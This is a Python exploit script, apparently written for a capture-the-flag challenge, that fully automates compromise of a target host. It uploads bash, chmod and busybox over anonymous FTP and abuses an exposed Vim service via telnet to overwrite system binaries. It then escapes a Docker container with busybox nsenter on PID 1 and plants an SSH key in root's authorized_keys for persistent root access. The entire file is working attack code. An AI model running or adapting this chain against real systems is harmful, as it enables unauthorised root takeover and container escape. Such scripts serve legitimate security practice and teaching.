# Sidequest4 exploit script
import argparse
import paramiko
from os import chmod
import telnetlib
import time
import os
import threading
from ftplib import FTP


# Function to send Vim commands
def sendVimCommand(conn, command):
    try:
        conn.write(command.encode('utf-8') + b'\n') 
        time.sleep(1) # Just to make sure everything works fine
        return 200
    except Exception as e:
        with open("logs", 'a') as logfile:
            logfile.write(f'{str(e)}\n--------------------------')
        return 404


# Function to upload binaries through FTP
def uploadBinary(fileList):
    ftpPort = 8075
    ftp = FTP()
    ftp.connect(address, ftpPort)
    ftp.set_pasv(False)
    authStatus = ftp.login()
    toUpload = 3  # Just a counter to keep track of the successful uploads


    if '230' in authStatus:
        for file in fileList:
            for filePath, fileName in file.items():   # Getting the key, value from the dictionary
                with open(filePath, 'rb') as f:
                    try:
                        ftp.storbinary(f'STOR {fileName}', f)
                        toUpload-=1
                    except Exception as e:
                        with open("logs", 'a') as logfile:
                            logfile.write(f'{str(e)}\n--------------------------')
                time.sleep(1)

    if toUpload == 0:  # If all files are uploaded successfully, we return 200.
        return 200
    else:
        return 404





def main(address):
    vimPort = 8085

    # Upload static binaries into the target machine through ftp
    fileList = [
        {
            './binaries/bash': 'bash',
            './binaries/chmod': 'chmod',
            './binaries/busybox': 'busybox',
        }
    ]

    status = uploadBinary(fileList)
    if status == 200:
        print("Binaries uploaded successfully")
    else:
        print("Some of the binaries was failed to upload. check the binaries/ dir and the file permissions.")
        return -1




    # Open the uploaded bash and overwrite the /usr/frosty/sh binary
    try:
        print("Overwriting /usr/frosty/sh binary with bash . . .")
        conn = telnetlib.Telnet(address, vimPort)
        command = ':edit /tmp/ftp/bash | :w! /usr/frosty/sh | :q' # This command opens /tmp/ftp/bash and save (overwrites) as /tmp/nano
        response = sendVimCommand(conn, command)
        time.sleep(2)

        if response == 404:
            print("Error occured, check logfile.")
            return

        print("Bash shell now accessible on port 8065")
    finally:
        conn.close()


    
    # Open the upload chmod binary and overwrite the nano binary
    try:
        print("Overwriting vim binary with chmod . . .")
        conn = telnetlib.Telnet(address, vimPort)
        command = ':edit /tmp/ftp/chmod | :w! /tmp/nano | :q' # This command opens /tmp/ftp/chmod and save (overwrites) as /tmp/vim
        response = sendVimCommand(conn, command)
        time.sleep(2)

        if response == 404:
            print("Error occured, check logfile.")
            return

        print("Vim is now overwritten with chmod.")
    finally:
        conn.close()



    # Adding exec permission to busybox using /tmp/nano (Lol its actually chmod).
    try:
        conn = telnetlib.Telnet(address, 8065)
        command = '/tmp/nano +x /tmp/ftp/busybox'
        response = sendVimCommand(conn, command)
        time.sleep(1)

        if response == 404:
            print("Error occured, check logfile.")
            return
        
        print("Added exec permission to busybox.")
    finally:
        conn.close()


    
# Function to listen for revshell connection
def connectSSH(address):
    os.system(f'ssh -i id_rsa -q -o StrictHostKeyChecking=no root@{address}')


# Function to generate and save ssh keys : id_rsa and id_rsa.pub
def generateSSHKeys():
    key = paramiko.RSAKey.generate(2048)
    private_key_path = 'id_rsa'
    public_key_path = 'id_rsa.pub'

    with open(private_key_path, 'w') as private_key_file:
        key.write_private_key(private_key_file)

    with open(public_key_path, 'w') as public_key_file:
        public_key_file.write(f"{key.get_name()} {key.get_base64()}\n")
    
    time.sleep(2)
    os.system('chmod 600 id_rsa')
    return 200




# The name says it
def getShell(address):
    try:
        conn = telnetlib.Telnet(address, 8065)
        command = '/tmp/ftp/busybox nsenter --target 1 --mount --uts --ipc --net --pid -- bash'   # Hijacking PID 1 to escape docker and gain root access
        response = sendVimCommand(conn, command)
        time.sleep(1)
        if response == 404:
            print("Error occured, check logfile.")
            return
        

        # Creating a .ssh directory
        command = f'mkdir /root/.ssh'
        response = sendVimCommand(conn, command)
        time.sleep(1)
        if response == 404:
            print("Error occured, check logfile.")
            return
        

        # Writing contents from generated id_rsa.pub
        generateSSHKeys()
        with open('id_rsa.pub', 'r') as f:
            content = f.read()

        command = f'echo "{content}" > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys'
        response = sendVimCommand(conn, command)
        time.sleep(1)
        if response == 404:
            print("Error occured, check logfile.")
            return
        print("Wrote id_rsa.pub into root's .ssh directory")
        

    except:
        print("Error occured, check if the service is available")





if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Sidequest 3 pwn script')
    parser.add_argument("--address", "-a", dest = "address", required = True, help = "Server IP Address")
    args = parser.parse_args()
    address = args.address
    main(address)
    getShell(address)
    connectSSH(address)

    
